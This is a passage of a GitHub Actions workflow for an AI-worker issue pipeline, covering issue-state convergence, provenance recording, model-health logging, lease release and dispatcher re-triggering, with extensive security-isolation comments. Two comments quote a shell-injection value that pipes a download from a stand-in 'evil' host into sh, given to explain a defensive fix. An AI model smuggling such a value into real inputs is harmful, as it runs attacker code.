          if [[ "${VERIFY_OUTCOME:-}" != "success" ]]; then
            echo '::warning::The pre-gate publish bundle did not verify against the worker'"'"'s pre-gate record, so no write-capable token was ever minted and nothing was published. The mismatch is in the Verify the publish bundle step log above.'
          elif [[ "${REPUBLISH_OUTCOME:-}" != "success" ]]; then
            echo '::warning::The pre-publish live-trust re-check did not pass (outcome='"${REPUBLISH_OUTCOME:-?}"') — either the target issue drifted (closed, rewritten, human-parked, or the claim was superseded) during the model+gate span, or the trust root did not match the pre-model digests. Publication was ABORTED and no human-owned issue state was changed; the specific cause is in the Re-verify live trust step log above.'
          elif [[ "${REPUBLISH_VERIFIED:-}" != "${PINNED_VERIFIER_SHA:-x}" ]]; then
            echo '::warning::The pre-publish live-trust re-check reported success but produced NO verifier attestation — its shell exited 0 without the live re-verification completing (the shape a short-circuited execution environment leaves behind). Publication was ABORTED, fail-closed, and no human-owned issue state was changed.'
          fi
          echo '::warning::The always() final_state job converges this issue to status:deferred, returning it to the redispatch pool.'

  # Final-state convergence runs as its OWN always() job (issue #127). The `worker` job runs the
  # model + host-side cargo gate under a hard `worker_timeout_minutes` timeout; a job timeout or a
  # cancellation kills even an in-job always() STEP, so a final-state step LIVING in `worker` could
  # never converge a timed-out run — the issue stayed status:in-progress forever while the separate
  # `release` job still freed its lease (no live lease + still busy = un-redispatchable). A separate
  # job is NOT bound by the worker timeout, mints a FRESH token (the worker's is minted before the
  # long model run), and derives the status from the worker job's outputs — which are EMPTY when the
  # worker was killed mid-run, so the logic fails closed to `deferred` (out of status:in-progress,
  # back into the redispatch pool). Unlike the old in-job step it does NOT swallow a failed status
  # write as a `::warning::` (that swallow re-created the same strand): it FAILS LOUD, and the
  # dispatcher's in-progress repair sweep is the backstop for a genuinely unreachable issues API.
  # Like provenance/model_health it runs NO target code, so co-locating an issues:write App token is
  # safe (the reason those trust-sensitive writes are not inside the hostile-code `worker` job).
  final_state:
    name: Converge final target issue state (no target code runs here)
    if: ${{ always() && !inputs.dry_run && needs.resolve.result == 'success' && needs.claim.result == 'success' }}
    # #500: do not put a no_change issue back in the deferred frontier until its typed health
    # record is durably attempted. The next dispatcher tick reads that validated ledger record;
    # without this edge it could race the recorder and launch the old route a third time.
    # always() above still converges to ordinary deferred state when telemetry itself fails.
    # [issue #575] `publish` too: pr_url now comes from the isolated publisher, and convergence must
    # observe its outcome rather than racing it. always() above keeps the deferral path intact — a
    # skipped, failed or refused publisher leaves PR_URL empty and this job writes status:deferred.
    needs: [resolve, claim, worker, publish, model_health]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only).
    environment: dispatch-secrets
    permissions:
      contents: read
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Mint App token for the final-state write
        id: app-token-final
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-issues: write

      - name: Set final target issue state
        env:
          GH_TOKEN: ${{ steps.app-token-final.outputs.token }}
          ACQUIRED: ${{ needs.claim.outputs.acquired }}
          EXHAUSTED: ${{ needs.worker.outputs.exhausted }}
          TRUST_OUTCOME: ${{ needs.worker.outputs.trust_outcome }}
          ATTEMPT_NUMBER: ${{ needs.worker.outputs.attempt_number }}
          ATTEMPT_VOIDED: ${{ needs.worker.outputs.attempt_voided }}
          MAX_ATTEMPTS: ${{ needs.resolve.outputs.max_attempts }}
          PR_URL: ${{ needs.publish.outputs.pr_url }}
        run: |
          set -euo pipefail
          status=deferred
          if [[ "$ACQUIRED" == true && "$EXHAUSTED" == true ]]; then
            # Attempt-budget exhaustion is BUDGET-driven, not a human question: the
            # machine-owned status:parked soft hold (scripts/park_policy.py defect 1), never
            # needs:user — worker-issue.py enforces the sticky human-unpark veto on the write.
            status=parked
          elif [[ "$ACQUIRED" == true && -n "$PR_URL" ]]; then
            # Completion is DEFERRED to the review-fix ARM path (the issue closes only when its
            # PR is approved cross-provider and armed); the review loop owns it from here.
            status=in-progress-review
          elif [[ "$ACQUIRED" == true && "$TRUST_OUTCOME" == success \
                  && "$ATTEMPT_VOIDED" != true \
                  && "$ATTEMPT_NUMBER" =~ ^[1-9][0-9]*$ \
                  && "$MAX_ATTEMPTS" =~ ^[1-9][0-9]*$ \
                  && "$ATTEMPT_NUMBER" -ge "$MAX_ATTEMPTS" ]]; then
            # Final allowed attempt ran without publishing a PR: the same budget-driven park.
            #
            # [registry #596] ...unless the attempt was VOIDED as a credential outage. This arm reads
            # ATTEMPT_NUMBER, which the void cannot retroactively lower, so without this guard a
            # final-attempt `auth` failure still parked the issue — the exact "credential rot
            # silently converts into a park" inversion the void exists to stop. The park POLICY is
            # untouched: an unvoided final attempt parks exactly as before, and the issue falls
            # through to `deferred` so the next tick re-derives the (now un-charged) budget and
            # re-dispatches.
            status=parked
          fi
          # FAIL LOUD on a failed write (issue #127): the old in-job step swallowed this as a
          # ::warning:: and left the issue stranded status:in-progress. A red job here is the
          # visible signal; the dispatcher in-progress repair sweep is the recovery backstop.
          python3 registry/scripts/worker-issue.py status \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --status "$status"

  # Provenance is REGISTRY-recorded and is the review loop's root of trust: the review sweep
  # fails closed on a missing record (the PR is never enumerated), so this job must FAIL LOUD —
  # recovery for a missed record is scripts/backfill-provenance.py. It runs as its OWN job (not
  # inside `worker`) because the worker job executes hostile target code host-side (the cargo
  # gate) BEFORE publish: a registry-write token co-located there could be hijacked (poisoned
  # registry checkout / $GITHUB_ENV / a lingering process) to forge provenance for arbitrary PRs
  # — precisely what this record must make impossible. This job executes NO target code, takes
  # the implementer identity from the pre-hostile claim outputs, verifies the (post-hostile) PR
  # against the live API bound to THIS run's issue, and stores only the SALTED account hash
  # (privacy: the registry is public — locked decision 22a).
  #
  # RECONCILE, don't trust the publisher's output (issue #128): `gh pr create` mutates GitHub
  # BEFORE pr_number reaches $GITHUB_OUTPUT, so a lost response / cancellation / local failure
  # after server-side creation would leave an open worker PR with an EMPTY pr_number — the record
  # was skipped, the review sweep never enumerated the PR, and the open PR blocked re-attempt.
  # This job therefore runs for EVERY acquired live attempt (not gated on pr_number) and recovers
  # the PR from the DETERMINISTIC head branch — built from trusted run identity (issue + run
  # id/attempt), never from the hostile worker output. A genuinely un-published attempt finds no
  # PR and records nothing.
  provenance:
    name: Reconcile + record implementer provenance (no target code runs here)
    if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' }}
    # [issue #575] `publish` is now the job that creates the PR, so the reconciliation must run
    # AFTER it or it would enumerate a PR that does not exist yet. The ROOT OF TRUST is unchanged:
    # this job still derives the head branch from run identity and re-reads the PR from the live
    # API — it does not consume needs.publish.outputs.pr_number, so a publisher that reported
    # nothing (or reported the wrong thing) cannot steer the record. always() keeps the
    # lost-response recovery path #128 added: a publisher that died after server-side creation is
    # still reconciled from the deterministic branch.
    needs: [resolve, claim, worker, publish]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT + REGISTRY_ADMIN_APP_ID/KEY, which
    # live in the `dispatch-secrets` environment (deployment-branch policy: default branch only)
    # — full rationale on the `claim` job in dispatch.yml.
    environment: dispatch-secrets
    permissions:
      contents: write   # registry provenance file via github.token — never in the worker job
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # Independent bot identity (issue #128): the bot-authored check keys on the target App bot
      # login, which the worker resolves as `<app-slug>[bot]` (the `target` step). Deriving it here
      # from a FRESHLY minted token's app-slug — instead of reading needs.worker.outputs.bot_login —
      # keeps reconciliation working even when a mid-publish CANCELLATION leaves the worker job's
      # outputs empty. Minimal scope (contents:read): this step only needs the app-slug; the PR read
      # is a public-repo read via github.token and the registry write is github.token contents:write.
      - name: Mint target-scoped App token (bot identity only)
        id: app-token-recon
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: read

      - name: Reconcile the PR from the head branch and record provenance (salted account hash only)
        id: provenance
        env:
          GH_TOKEN: ${{ github.token }}
          # Raw handle + salt arrive via env only (argv is echoed into public logs) and only the
          # 16-hex hash is stored; this job runs no target code, so the salt cannot leak to it.
          WORKER_IMPL_ACCOUNT: ${{ needs.claim.outputs.account }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
          # DETERMINISTIC head branch — MUST match worker-live.sh's `branch=` construction. Built
          # from trusted run identity (github.run_id/run_attempt are shared across every job in this
          # run), never from the hostile worker job's pr_number output (issue #128).
          HEAD_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
          # `<app-slug>[bot]` == the login the worker's `target` step verifies via /users/<slug>[bot].
          VERIFY_BOT_LOGIN: ${{ steps.app-token-recon.outputs.app-slug }}[bot]
          # Catalog-controlled account fields reach this contents:write + PROVENANCE_SALT job via
          # env ONLY — never interpolated into the run: shell source, where a provider/alias like
          # `x"; curl evil|sh; echo "` would execute (issue #199). worker-pr.py re-validates the
          # provider server-side (provenance_record: must be anthropic|openai).
          IMPL_PROVIDER: ${{ needs.claim.outputs.provider }}
          IMPL_ALIAS: ${{ needs.claim.outputs.model }}
        run: |
          python3 registry/scripts/worker-pr.py reconcile-provenance \
            --registry-repo "$GITHUB_REPOSITORY" \
            --target-repo "${{ inputs.target_repo }}" \
            --head-branch "$HEAD_BRANCH" \
            --impl-provider "$IMPL_PROVIDER" \
            --impl-alias "$IMPL_ALIAS" \
            --issue "${{ inputs.issue_number }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --verify-bot-login "$VERIFY_BOT_LOGIN"

      # Guarded on the RECONCILED pr_number (issue #128): a genuinely un-published attempt records
      # no provenance and has no PR to stamp, so these steps skip instead of failing on an empty PR.
      - name: Mint App token for the review-state stamp
        id: app-token-stamp
        if: ${{ steps.provenance.outputs.pr_number != '' }}
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-issues: write
          permission-pull-requests: write

      - name: Stamp the initial review state on the draft PR
        if: ${{ steps.provenance.outputs.pr_number != '' }}
        env:
          GH_TOKEN: ${{ steps.app-token-stamp.outputs.token }}
        run: |
          python3 registry/scripts/worker-pr.py review-state set \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ steps.provenance.outputs.pr_number }}" \
            --state needs

  # Model-access health record (registry #32): consumes the worker's exit CLASS (success OR any
  # failure) into the registry model-health ledger so `decide` (in the groom sweep) can alert when
  # a whole provider stops having working model access. A SEPARATE job — like `provenance` — because
  # the worker job executes hostile target code host-side (the cargo gate): a registry-write token
  # co-located there could forge health records. This job runs NO target code, takes the raw handle
  # via env (salted before it reaches the ledger — decision 22a), and never fails the pipeline.
  model_health:
    name: Record model-access health (no target code runs here)
    if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && needs.worker.outputs.exit_class != '' }}
    # [issue #575] Deliberately NOT rewired onto `publish`. This job records the MODEL LAUNCH
    # outcome, which is fully determined before the gate and carries no PR identity — the exit
    # class it consumes is a pre-gate worker step output. The classes that matter most here
    # (auth/credential outages, session limits) are exactly the ones where no bundle exists and the
    # publisher never runs, so a needs edge would delay — and on the `final_state` chain
    # (final_state needs model_health) could strand — the health record behind a job that has
    # nothing to say about it.
    needs: [resolve, claim, worker]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT, which lives in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
    # rationale on the `claim` job in dispatch.yml.
    environment: dispatch-secrets
    permissions:
      contents: write   # CAS-append data/model-health.json (on the `ledger` branch) via github.token
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Append the model-access health record (salted account hash only)
        env:
          GH_TOKEN: ${{ github.token }}
          REGISTRY_REPO: ${{ github.repository }}
          # Raw handle + salt arrive via env only (argv is echoed into public logs); the script
          # salts the handle so only the 16-hex hash is stored. This job runs no target code.
          WORKER_ACCOUNT_HANDLE: ${{ needs.claim.outputs.account }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
          # Catalog-controlled (provider/alias) and provider-derived (reset-hint from a rate-limit
          # response) fields reach this contents:write + PROVENANCE_SALT job via env ONLY — never
          # in the run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
          # model-health.py record re-validates the provider against {anthropic, openai, fleet}.
          PROVIDER: ${{ needs.claim.outputs.provider }}
          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
          EXIT_CLASS: ${{ needs.worker.outputs.exit_class }}
          RESET_HINT: ${{ needs.worker.outputs.reset_hint }}
          # The attempt of the worker job that PRODUCED the outcome — never this recorder job's
          # own $GITHUB_RUN_ATTEMPT (review round 1 of #425): a recorder-only retry replays the
          # worker's preserved output (same attempt -> the script dedups the replay), while a
          # full re-run re-executes the worker, whose fresh attempt keeps the genuinely new
          # outcome countable. The empty-output fallback below fails toward RECORDING (a rare
          # duplicate beats a silently dropped outcome).
          OUTCOME_ATTEMPT: ${{ needs.worker.outputs.outcome_attempt }}
        run: |
          python3 registry/scripts/model-health.py record \
            --provider "$PROVIDER" \
            --model-alias "$MODEL_ALIAS" \
            --exit-class "$EXIT_CLASS" \
            --reset-hint "$RESET_HINT" \
            --run-id "$GITHUB_RUN_ID.${OUTCOME_ATTEMPT:-$GITHUB_RUN_ATTEMPT}"

  release:
    name: Always release live account lease
    if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' }}
    # [issue #575] `publish` too: freeing the account lease is what lets the dispatcher pick this
    # issue up again, so releasing while the publisher is still opening the PR would let the next
    # tick race an in-flight publish. always() is unchanged, so the lease is STILL released on
    # every path — including a publisher that failed, was refused, or was skipped entirely.
    needs: [claim, worker, publish]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Release CAS lease by claim id
        env:
          GH_TOKEN: ${{ github.token }}
          CLAIM_ID: ${{ needs.claim.outputs.claim_id }}
        run: |
          set -euo pipefail
          [[ "$CLAIM_ID" =~ ^[0-9a-f]{32}$ ]] || { echo '::error::unsafe or missing claim id'; exit 1; }
          python3 registry/scripts/select-and-claim.py \
            --release "$CLAIM_ID" \
            --repo "$GITHUB_REPOSITORY"

  # Doorbell: dispatch.yml's workflow_run trigger NEVER fires for these runs — they are
  # started via the repo GITHUB_TOKEN, and GitHub suppresses workflow-triggering events
  # from GITHUB_TOKEN-initiated runs (measured 2026-07-17: zero workflow_run deliveries).
  # workflow_dispatch API calls are the documented exception to that suppression, so each
  # finished run explicitly re-rings the dispatcher; its registry-dispatcher concurrency
  # group coalesces bursts. always(): a FAILED run is exactly when the sweep must
  # re-enumerate (deferral repair, missed-fix accounting, next round).
  doorbell:
    name: doorbell (re-ring dispatcher)
    # Also waits on final_state (issue #127) so the re-rung dispatcher observes the CONVERGED issue
    # status, never the transient "status:in-progress + lease already released" window that opens
    # while final_state runs in parallel with release. A skipped final_state (dry run / no claim)
    # completes immediately and does not hold the doorbell.
    needs: [release, final_state]
    if: ${{ always() }}
    runs-on: ubuntu-latest
    timeout-minutes: 3
    permissions:
      actions: write
    steps:
      - name: Ring dispatch.yml
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh workflow run dispatch.yml -R "$GITHUB_REPOSITORY" || echo "::warning::doorbell ring failed (cron backstop covers this tick)"
